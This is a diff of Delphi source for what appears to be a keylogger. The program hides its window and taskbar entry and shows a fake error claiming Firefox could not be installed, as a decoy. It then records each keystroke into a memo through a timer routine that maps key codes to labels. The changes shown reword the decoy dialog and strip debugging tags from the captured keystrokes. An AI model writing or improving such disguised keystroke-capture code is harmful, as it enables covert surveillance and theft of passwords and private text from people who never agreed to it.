@@ -73,7 +73,7 @@ memo1.lines.add('Time Written: ' + TimeToStr(now));
 closefile(f);
 Application.ShowMainForm := False;   //Hides Form
 Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
-MessageDlg('ERROR! Firefox can not be installed on this PC. You do not have the required permission to do so. Please consult your IT departement to resolve this issue.',mtError,[mbCancel,mbHelp], 1);
+MessageDlg('Firefox could not be installed on this Computer. You do not have the required permission.',mtError,[mbOK], 1);
 end;
 
 procedure TForm1.Timer1Timer(Sender: TObject); //Main Procedure based of an interval
@@ -141,7 +141,7 @@ begin
     120: DisplayAction(' [F9] ');
     121: DisplayAction(' [F10] ');
     122: DisplayAction(' [F11] ');
-    123: Application.ShowMainForm := true; //failed  attempt to secret form open
+   // 123: Application.ShowMainForm := true; //failed  attempt to secret form open
     123: DisplayAction(' [F12] ');
     144: DisplayAction(' [NUM LOCK] ');
     145: DisplayAction(' [SCROLL LOCK] ');
@@ -167,9 +167,8 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
-    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
-    Memo1.Lines.Add('');
+    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey))
+    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey));
     //Memo1.Lines.SaveToFile(d);
   end
   else // Exception for all undefin ed keys
